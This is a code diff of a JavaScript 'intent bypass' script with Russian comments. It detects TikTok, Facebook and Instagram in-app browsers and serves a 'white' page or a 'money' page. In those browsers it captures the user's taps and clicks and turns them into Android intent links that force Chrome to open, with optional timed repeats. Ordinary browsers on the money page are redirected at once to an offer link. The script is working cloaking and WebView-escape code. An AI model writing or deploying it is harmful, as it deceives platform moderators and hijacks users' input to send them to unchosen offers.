@@ -1,289 +1,207 @@
-(function () {
+(function (win, doc) {
   'use strict';
 
-  var cfg   = window.IntentBypassConfig || {};
-  var PAGE  = (cfg.page || '').toLowerCase(); // 'money' или всё остальное = white
-  var DEBUG = !!cfg.debug;
+  var cfg = Object.assign({
+    page: 'white',                 // 'money' или 'white' (дефолт — white)
+    intentTarget: '',              // что открывать через intent
+    cleanTarget: '',               // куда редиректить в нормальном браузере
+    autoAttemptOnLoad: false,      // автопопытка только в WebView
+    repeatEveryMs: 0,              // период повторных попыток (0 = без повторов)
+    repeatMaxMs: 0,                // максимум времени для повторов
+    userActionEvents: ['pointerdown', 'touchstart', 'click'],
+    debug: false
+  }, win.IntentBypassConfig || {});
 
   function log() {
-    if (DEBUG && window.console && console.log) {
-      console.log.apply(console, ['[intent-hybrid]'].concat([].slice.call(arguments)));
+    if (!cfg.debug || !win.console) return;
+    var args = Array.prototype.slice.call(arguments);
+    args.unshift('[intent-main]');
+    console.log.apply(console, args);
+  }
+
+  var ua = (win.navigator && win.navigator.userAgent) || '';
+  var isAndroid = /Android/i.test(ua);
+  var isIOS     = /iPhone|iPad|iPod/i.test(ua);
+
+  var isTikTok  = /TikTok|ttwebview|Bytedance|Aweme/i.test(ua);
+  var isFB      = /FB_IAB|FBAN|FBAV|Instagram/i.test(ua);
+  var isWVFlag  = /; wv\)/i.test(ua) || /Version\/\d+\.\d+ Mobile\/\S+ Safari\//i.test(ua);
+
+  var isWebView = isTikTok || isFB || isWVFlag;
+
+  var isChrome  = /Chrome/i.test(ua);
+  var isAndroidChromeLike = isAndroid && (isChrome || isTikTok || isFB);
+
+  log('env', { ua: ua, isAndroid: isAndroid, isIOS: isIOS, isWebView: isWebView, isAndroidChromeLike: isAndroidChromeLike });
+
+  // Стрипуем antiHash, чтобы понимать "тот же" URL
+  function stripAntiHash(url) {
+    try {
+      var u = new URL(url, win.location.origin);
+      u.searchParams.delete('antiHash');
+      return u.toString();
+    } catch (e) {
+      return url;
     }
   }
 
-  function UA() {
-    return (navigator.userAgent || navigator.vendor || '').toLowerCase();
-  }
-
-  function isAndroid()   { return /android/.test(UA()); }
-  function isIOS()       { return /(iphone|ipad|ipod|ios)/.test(UA()); }
-  function isChromeLike(){ return /(chrome|crios)/.test(UA()); }
-
-  // Heuristics для in-app WebView (TikTok, FB, IG, WebView "wv")
-  function isInAppWebView() {
-    var u = UA();
-    var hasWV   = u.includes(' wv') || u.includes('; wv)');
-    var isTT    = /tiktok|musical_ly|ttwebview|bytedance|aweme/.test(u);
-    var isFBIG  = /fban|fbav|fb_iab|instagram|igapp|messenger/.test(u);
-    var isOther = /line\/|wechat|snapchat|pinterest/.test(u);
-    return hasWV || isTT || isFBIG || isOther;
-  }
-
-  function normUrl(u) {
-    if (!u) return '';
-    var s = String(u).trim();
-    if (!s) return '';
+  // Безопасная навигация: не идём на тот же самый URL
+  function safeNavigate(url) {
+    if (!url) return;
+    var current = win.location.href;
+    var t1 = stripAntiHash(current);
+    var t2 = stripAntiHash(url);
+    if (t1 === t2) {
+      log('safeNavigate: same URL, skip', t1);
+      return;
+    }
+    log('safeNavigate →', url);
     try {
-      return new URL(s, location.href).href;
-    } catch (_) {
-      return s;
+      win.location.href = url;
+    } catch (e) {
+      win.location.assign(url);
     }
   }
 
-  var INTENT_TARGET = normUrl(cfg.intentTarget) || '';
-  var CLEAN_TARGET  = normUrl(cfg.cleanTarget)  || INTENT_TARGET || '';
-  var AUTO          = !!cfg.autoAttemptOnLoad;
-
-  function buildChromeIntent(targetUrl, fallbackUrl) {
-    var t = normUrl(targetUrl);
-    if (!t) return '';
-    var f = normUrl(fallbackUrl || targetUrl) || t;
-    return 'intent://navigate?url=' + encodeURIComponent(t) +
-           '#Intent;scheme=googlechrome;package=com.android.chrome;' +
-           'S.browser_fallback_url=' + encodeURIComponent(f) + ';end;';
+  function buildChromeIntent(intentUrl, fallbackUrl) {
+    var fallback = fallbackUrl || intentUrl;
+    return 'intent://navigate?url=' + encodeURIComponent(intentUrl) +
+      '#Intent;scheme=googlechrome;package=com.android.chrome;' +
+      'S.browser_fallback_url=' + encodeURIComponent(fallback) + ';end;';
   }
 
-  function buildXSafari(targetUrl) {
-    var t = normUrl(targetUrl);
-    if (!t) return '';
-    return 'x-safari-https://' + t.replace(/^https?:\/\//i, '');
+  function openExternalViaIntent() {
+    var intentTarget = cfg.intentTarget;
+    var cleanTarget  = cfg.cleanTarget || cfg.intentTarget;
+
+    if (!intentTarget) {
+      log('openExternalViaIntent: no intentTarget, abort');
+      return;
+    }
+
+    // Если ЭТО НЕ webview — никакого intent
+    if (!isWebView) {
+      log('openExternalViaIntent: not a WebView, no intent');
+      // На money-page вне webview мы делаем обычный редирект на cleanTarget
+      if (cfg.page === 'money' && cleanTarget) {
+        safeNavigate(cleanTarget);
+      }
+      return;
+    }
+
+    // Внутри WebView вызываем intent
+    if (isAndroid && isAndroidChromeLike) {
+      var chromeIntent = buildChromeIntent(intentTarget, cleanTarget);
+      log('openExternalViaIntent: Android intent', chromeIntent);
+      safeNavigate(chromeIntent);
+      return;
+    }
+
+    if (isIOS) {
+      // Для iOS можно вытащить в Safari простым https-редиректом
+      log('openExternalViaIntent: iOS, open https', intentTarget);
+      safeNavigate(intentTarget);
+      return;
+    }
+
+    // Другие WebView — пробуем хотя бы чистую ссылку
+    log('openExternalViaIntent: generic WebView, fallback clean', cleanTarget);
+    if (cleanTarget) {
+      safeNavigate(cleanTarget);
+    }
   }
 
-  function sendBeacon(status, extra) {
-    if (!cfg.beaconEndpoint) return;
-    try {
-      var payload = {
-        ts: Date.now(),
-        status: status,
-        extra: extra || {},
-        ua: navigator.userAgent || ''
-      };
-      if (navigator.sendBeacon) {
-        navigator.sendBeacon(cfg.beaconEndpoint, JSON.stringify(payload));
+  function bindUserActionOnce(handler) {
+    if (!cfg.userActionEvents || !cfg.userActionEvents.length) {
+      cfg.userActionEvents = ['pointerdown', 'touchstart', 'click'];
+    }
+    var fired = false;
+
+    function wrapper(ev) {
+      if (fired) return;
+      fired = true;
+      try { ev && ev.preventDefault && ev.preventDefault(); } catch (e) {}
+      handler();
+    }
+
+    cfg.userActionEvents.forEach(function (evt) {
+      doc.addEventListener(evt, wrapper, { once: true, passive: false });
+    });
+  }
+
+  function setupByPage() {
+    // MONEY PAGE
+    if (cfg.page === 'money') {
+      if (isWebView) {
+        // В WebView: любое действие пользователя → intent на текущую страницу (intentTarget),
+        // а fallback в intent ведёт уже на offer_link (cleanTarget).
+        log('setup: money + WebView → userAction -> intent');
+        bindUserActionOnce(openExternalViaIntent);
       } else {
-        fetch(cfg.beaconEndpoint, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
-        }).catch(function(){});
+        // НЕ WebView: сразу один раз редиректим на cleanTarget (offer_link)
+        if (cfg.cleanTarget) {
+          log('setup: money + real browser → immediate redirect to cleanTarget');
+          // Делаем это после полной загрузки, чтобы не ломать совсем уж всё
+          if (doc.readyState === 'complete' || doc.readyState === 'interactive') {
+            safeNavigate(cfg.cleanTarget);
+          } else {
+            doc.addEventListener('DOMContentLoaded', function () {
+              safeNavigate(cfg.cleanTarget);
+            });
+          }
+        }
       }
-    } catch (e) {
-      log('beacon error:', e);
-    }
-  }
-
-  // --- базовая операция: дернуть интент / x-safari / прямой URL ---
-  function openExternalViaIntent(targetUrl, reason) {
-    var t = normUrl(targetUrl);
-    if (!t) {
-      log('openExternalViaIntent: empty target, skip');
       return;
     }
 
-    var finalUrl;
-    if (isAndroid() && isChromeLike()) {
-      finalUrl = buildChromeIntent(t, t);
-    } else if (isIOS()) {
-      finalUrl = buildXSafari(t);
+    // WHITE PAGE (всё, что НЕ 'money')
+    if (isWebView) {
+      // В WebView: любое действие → intent на эту же страницу
+      log('setup: white + WebView → userAction -> intent');
+      bindUserActionOnce(openExternalViaIntent);
     } else {
-      finalUrl = t;
-    }
-
-    log('openExternalViaIntent:', reason, '->', finalUrl);
-    sendBeacon('attempt', { reason: reason, finalUrl: finalUrl });
-
-    try {
-      var w = window.open(finalUrl, '_blank');
-      log('window.open ->', w);
-      if (!w && finalUrl !== t) {
-        // popup заблокирован, пробуем хотя бы прямой URL
-        location.href = t;
-      }
-    } catch (e) {
-      log('openExternalViaIntent error:', e);
-      sendBeacon('error', { message: String(e) });
-      try {
-        location.href = t;
-      } catch (_) {
-        location.assign(t);
-      }
+      // В нормальном браузере на вайте НИЧЕГО не перехватываем
+      log('setup: white + real browser → no interception');
     }
   }
 
-  function redirectNormally(targetUrl, reason) {
-    var t = normUrl(targetUrl);
-    if (!t) {
-      log('redirectNormally: empty target, skip');
+  function setupAutoAttempt() {
+    if (!cfg.autoAttemptOnLoad) {
+      log('autoAttemptOnLoad = false, skip auto attempts');
       return;
     }
-    log('redirectNormally:', reason, '->', t);
-    try {
-      location.href = t;
-    } catch (e) {
-      location.assign(t);
-    }
-  }
-
-  // --- WHITE: базовая логика (как старый main.js) ---
-  function initWhiteBasic(inApp) {
-    if (!inApp) {
-      log('WHITE basic: normal browser, idle.');
+    if (!isWebView) {
+      log('autoAttemptOnLoad: not a WebView, skip auto attempts');
       return;
     }
-    var selfTarget = INTENT_TARGET || CLEAN_TARGET || location.href;
-    log('WHITE basic: in WebView, single auto intent to self:', selfTarget);
-    openExternalViaIntent(selfTarget, 'white-basic');
-  }
 
-  // --- WHITE: расширенная логика, если AUTO === true ---
-  function initWhiteAuto(inApp) {
-    if (!inApp) {
-      log('WHITE auto: normal browser, idle.');
-      return;
-    }
-    var selfTarget = INTENT_TARGET || CLEAN_TARGET || location.href;
-    log('WHITE auto: in WebView, auto intent + event listeners to self:', selfTarget);
+    var every = Number(cfg.repeatEveryMs) || 0;
+    var max   = Number(cfg.repeatMaxMs) || 0;
+    var start = Date.now();
+    var done  = false;
 
-    // Авто-попытка сразу
-    openExternalViaIntent(selfTarget, 'white-auto-initial');
-
-    // Слушаем любые действия и повторяем попытку, если надо
-    function handler(ev) {
-      try {
-        ev.preventDefault && ev.preventDefault();
-        ev.stopPropagation && ev.stopPropagation();
-      } catch (_) {}
-      log('WHITE auto event:', ev.type, '-> intent(self)');
-      openExternalViaIntent(selfTarget, 'white-auto-event-' + ev.type);
-    }
-
-    var optsPassiveFalse = { passive: false, capture: true };
-    var optsPassiveTrue  = { passive: true,  capture: true };
-
-    document.addEventListener('click',       handler, optsPassiveTrue);
-    document.addEventListener('pointerdown', handler, optsPassiveTrue);
-    document.addEventListener('touchstart',  handler, optsPassiveFalse);
-    document.addEventListener('keydown', function (e) {
-      if (e.key === 'Enter' || e.key === ' ') handler(e);
-    }, true);
-  }
-
-  // --- MONEY: базовая логика (как старый main.js) ---
-  function initMoneyBasic(inApp) {
-    var offer = INTENT_TARGET || CLEAN_TARGET;
-
-    if (!inApp) {
-      if (!offer) {
-        log('MONEY basic: normal browser, but no offer, idle.');
+    function tick() {
+      if (done) return;
+      openExternalViaIntent();
+      if (!every || every <= 0) {
+        done = true;
         return;
       }
-      log('MONEY basic: normal browser, instant redirect to offer.');
-      redirectNormally(offer, 'money-basic');
-      return;
-    }
-
-    // В WebView: любое действие вызывает интент на текущий URL
-    log('MONEY basic: in WebView, events -> intent(current URL).');
-
-    function handler(ev) {
-      try {
-        ev.preventDefault && ev.preventDefault();
-        ev.stopPropagation && ev.stopPropagation();
-      } catch (_) {}
-      var currentUrl = location.href;
-      log('MONEY basic event:', ev.type, '-> intent(currentUrl=', currentUrl, ')');
-      openExternalViaIntent(currentUrl, 'money-basic-event-' + ev.type);
-    }
-
-    var optsPassiveFalse = { passive: false, capture: true };
-    var optsPassiveTrue  = { passive: true,  capture: true };
-
-    document.addEventListener('click',       handler, optsPassiveTrue);
-    document.addEventListener('pointerdown', handler, optsPassiveTrue);
-    document.addEventListener('touchstart',  handler, optsPassiveFalse);
-    document.addEventListener('keydown', function (e) {
-      if (e.key === 'Enter' || e.key === ' ') handler(e);
-    }, true);
-  }
-
-  // --- MONEY: расширенная логика, если AUTO === true ---
-  function initMoneyAuto(inApp) {
-    var offer = INTENT_TARGET || CLEAN_TARGET;
-
-    if (!inApp) {
-      if (!offer) {
-        log('MONEY auto: normal browser, but no offer, idle.');
+      if (max && (Date.now() - start > max)) {
+        log('autoAttempt: reached max duration, stop');
+        done = true;
         return;
       }
-      log('MONEY auto: normal browser, instant redirect to offer.');
-      redirectNormally(offer, 'money-auto');
-      return;
+      setTimeout(tick, every);
     }
 
-    // В WebView: сразу пытаемся интентом вытащить текущую страницу + слушаем действия
-    log('MONEY auto: in WebView, auto intent(current URL) + events.');
-
-    var currentUrl = location.href;
-    openExternalViaIntent(currentUrl, 'money-auto-initial');
-
-    function handler(ev) {
-      try {
-        ev.preventDefault && ev.preventDefault();
-        ev.stopPropagation && ev.stopPropagation();
-      } catch (_) {}
-      var nowUrl = location.href;
-      log('MONEY auto event:', ev.type, '-> intent(currentUrl=', nowUrl, ')');
-      openExternalViaIntent(nowUrl, 'money-auto-event-' + ev.type);
-    }
-
-    var optsPassiveFalse = { passive: false, capture: true };
-    var optsPassiveTrue  = { passive: true,  capture: true };
-
-    document.addEventListener('click',       handler, optsPassiveTrue);
-    document.addEventListener('pointerdown', handler, optsPassiveTrue);
-    document.addEventListener('touchstart',  handler, optsPassiveFalse);
-    document.addEventListener('keydown', function (e) {
-      if (e.key === 'Enter' || e.key === ' ') handler(e);
-    }, true);
+    log('autoAttemptOnLoad: start, every=', every, 'max=', max);
+    // Стартуем чуть позже, чтобы дать странице догрузиться
+    setTimeout(tick, 300);
   }
 
-  // --- boot ---
+  // === Инициализация ===
+  setupByPage();
+  setupAutoAttempt();
 
-  function boot() {
-    var inApp    = isInAppWebView();
-    var pageType = (PAGE === 'money') ? 'money' : 'white';
-
-    log('boot hybrid:', { pageType: pageType, inApp: inApp, auto: AUTO, ua: UA() });
-
-    if (pageType === 'money') {
-      if (AUTO) initMoneyAuto(inApp);
-      else      initMoneyBasic(inApp);
-    } else {
-      if (AUTO) initWhiteAuto(inApp);
-      else      initWhiteBasic(inApp);
-    }
-  }
-
-  if (document.readyState === 'complete' || document.readyState === 'interactive') {
-    boot();
-  } else {
-    document.addEventListener('DOMContentLoaded', boot);
-  }
-
-  // Для дебага
-  window.__intentHybrid = {
-    cfg: cfg,
-    isInAppWebView: isInAppWebView,
-    UA: UA
-  };
-})();
+})(window, document);
